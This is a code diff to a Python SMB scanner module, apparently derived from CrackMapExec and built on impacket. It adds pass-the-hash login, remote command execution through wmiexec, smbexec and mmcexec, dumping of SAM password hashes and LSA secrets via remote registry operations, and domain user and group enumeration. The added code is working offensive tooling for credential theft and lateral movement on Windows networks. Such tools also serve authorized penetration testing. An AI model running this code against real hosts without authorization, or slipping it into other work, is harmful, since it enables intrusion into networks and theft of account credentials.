@@ -12,27 +12,18 @@ from impacket.smb import SMB_DIALECT
 from impacket.smb3structs import SMB2_DIALECT_21
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
 
+from .exec.smbexec import SMBEXEC
+from .exec.wmiexec import WMIEXEC
+from .exec.mmcexec import MMCEXEC
+from .enum import Enum
 from utils.output import Output
+from utils.utils import AuthFailure, sizeof_fmt, gen_random_string
 
 """
 Lot of code here taken from CME, @byt3bl33d3r did an awesome job with impacket
 """
-
-def sizeof_fmt(num, suffix='B'):
-    for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
-        if abs(num) < 1024.0:
-            return "%3.1f %s%s" % (num, unit, suffix)
-        num /= 1024.0
-    return "%.1f %s%s" % (num, 'Yi', suffix)
-
-import random
-import string
-def gen_random_string(length=10):
-    return ''.join(random.sample(string.ascii_letters, int(length)))
-
-class AuthFailure(Exception):
-    pass
 
 class SMBScan:
 
@@ -44,6 +35,11 @@ class SMBScan:
         self.conn = None
         self.authenticated = False
         self.smbv1 = None
+        self.creds = None
+        self.is_admin = False
+
+        self.remote_ops = None
+        self.bootkey = None
 
     def url(self, path=None):
         if path:
@@ -63,10 +59,12 @@ class SMBScan:
         try:
             if username == None:
                 self.conn.login('' , '')
-                is_admin = self.check_if_admin(domain, '', '', hash)
+                self.is_admin = self.check_if_admin(domain, '', '', hash)
+                self.creds = {'username': '', 'password': '', 'domain': domain}
             else:
                 if password != None:
                     self.conn.login(username, password, domain)
+                    self.creds = {'username': username, 'password': password, 'domain': domain}
                 elif hash != None:
                     if not ':' in hash:
                         nt_hash = hash
@@ -76,8 +74,9 @@ class SMBScan:
                         lm_hash = hash.split(':')[0]
 
                     self.conn.login(username, '', domain, lm_hash, nt_hash)
+                    self.creds = {'username': username, 'hash': hash, 'domain': domain}
 
-                is_admin = self.check_if_admin(domain, username, password, hash)
+                self.is_admin = self.check_if_admin(domain, username, password, hash)
 
             success = True
 
@@ -90,7 +89,7 @@ class SMBScan:
 
         self.authenticated = success
 
-        return success, is_admin
+        return success, self.is_admin
 
     def get_server_info(self):
         if not self.conn:
@@ -159,6 +158,11 @@ class SMBScan:
             self.smbv1 = None
             self.authenticated = False
             self.conn = None
+            self.creds = None
+            self.is_admin = False
+
+            self.remote_ops = None
+            self.bootkey = None
 
     def check_if_admin(self, domain='WORKGROUP', username='', password=None, hash=None):
         admin_privs = False
@@ -270,3 +274,152 @@ class SMBScan:
                 yield {'type': 'folder', 'name': path}
         except Exception as e:
             Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
+
+    def exec(self, command, exec_method=None, get_output=True):
+
+        if not exec_method:
+            exec_methods = ['wmiexec', 'smbexec', 'mmcexec']
+        else:
+            exec_methods = [exec_method]
+
+        smb_share = "C$"
+        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
+        username = self.creds['username'] if 'username' in self.creds else ''
+        password = self.creds['password'] if 'password' in self.creds else ''
+        hash = self.creds['hash'] if 'hash' in self.creds else ''
+        # I don't support kerberos yet
+
+        output = None
+        exec = None
+
+        for method in exec_methods:
+            if method == 'wmiexec':
+                try:
+                    exec = WMIEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share)
+                    break
+                except:
+                    Output.write({'target': self.url(), 'message': "Error execution command via wmiexec:\n%s" % traceback.format_exc()})
+                    continue
+            elif method == 'smbexec':
+                try:
+                    exec = SMBEXEC(self.hostname, username, password, domain, hash, smb_share)
+                    break
+                except:
+                    Output.write({'target': self.url(), 'message': "Error execution command via smbexec:\n%s" % traceback.format_exc()})
+                    continue
+            elif method == 'mmcexec':
+                try:
+                    exec = MMCEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share)
+                    break
+                except:
+                    Output.write({'target': self.url(), 'message': "Error execution command via smbexec:\n%s" % traceback.format_exc()})
+                    continue
+            else:
+                Output.write({'target': self.url(), 'message': "Unknown execution method: %s" % method})
+
+        if exec == None:
+            return None
+
+        output = exec.execute(command, get_output)
+        if output == None:
+            return None
+        return output
+
+    def enable_remoteops(self):
+        if self.remote_ops is not None and self.bootkey is not None:
+            return
+
+        try:
+            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
+            self.remote_ops.enableRegistry()
+            self.bootkey = self.remote_ops.getBootKey()
+        except Exception as e:
+            self.logger.error('RemoteOperations failed: {}'.format(e))
+
+    def dump_sam(self):
+        self.enable_remoteops()
+
+        sam_entries = []
+        def new_sam_hash(sam_hash):
+            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
+            sam_entries.append({'username': username, 'hash': ':'.join((lmhash, nthash))})
+
+        if self.remote_ops and self.bootkey:
+            SAMFileName = self.remote_ops.saveSAM()
+            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: new_sam_hash(secret))
+
+            SAM.dump()
+
+            try:
+                self.remote_ops.finish()
+            except Exception as e:
+                logging.debug("Error calling remote_ops.finish(): {}".format(e))
+
+            self.remote_ops = None
+            self.bootkey = None
+
+            SAM.finish()
+
+        return sam_entries
+
+    def dump_lsa(self):
+        self.enable_remoteops()
+
+        lsa_entries = []
+        def new_lsa_secret(secret):
+            lsa_entries.append({'secret': secret})
+
+        if self.remote_ops and self.bootkey:
+
+            SECURITYFileName = self.remote_ops.saveSECURITY()
+
+            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
+                             perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))
+
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
+
+            try:
+                self.remote_ops.finish()
+            except Exception as e:
+                logging.debug("Error calling remote_ops.finish(): {}".format(e))
+
+            self.remote_ops = None
+            self.bootkey = None
+
+            LSA.finish()
+
+        return lsa_entries
+
+    def enum_users(self):
+        if self.conn == None:
+            return
+        if self.creds == None:
+            return
+
+        username = self.creds['username'] if 'username' in self.creds else ''
+        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
+        password = self.creds['password'] if 'password' in self.creds else ''
+        hash = self.creds['hash'] if 'hash' in self.creds else ''
+
+        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)
+
+        for user in enum.enumUsers():
+            yield user
+
+    def enum_groups(self):
+        if self.conn == None:
+            return
+        if self.creds == None:
+            return
+
+        username = self.creds['username'] if 'username' in self.creds else ''
+        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
+        password = self.creds['password'] if 'password' in self.creds else ''
+        hash = self.creds['hash'] if 'hash' in self.creds else ''
+
+        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)
+
+        for group in enum.enumGroups():
+            yield group
+
